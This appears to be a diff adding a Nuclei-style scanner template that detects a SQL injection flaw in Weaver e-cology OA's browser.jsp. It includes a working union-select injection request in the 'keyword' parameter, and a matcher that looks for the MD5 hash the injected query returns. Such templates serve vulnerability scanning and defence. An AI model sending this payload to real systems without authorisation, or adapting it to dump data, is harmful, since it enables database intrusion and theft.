@@ -1,0 +1,26 @@
+id: weaver-browser-sql-injection
+info:
+  name: Weaver e-cology OA browser.jsp keyword SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Weaver e-cology OA browser.jsp contains a SQL injection vulnerability in the `keyword` parameter that could allow attackers to retrieve sensitive database information.
+  tags: sql-injection
+  reference:
+    - https://www.weaver.com.cn
+
+http:
+  - raw:
+      - |
+        GET /mobile/%20/plugin/browser.jsp?isDis=1&browserTypeId=269&keyword=1%27%20union%20select%201,(select%20sys.fn_sqlvarbasetostr(HashBytes(%27MD5%27,%27123456%27)))%20union%20select%201,%271 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "0xe10adc3949ba59abbe56e057f20f883e"
+        part: body
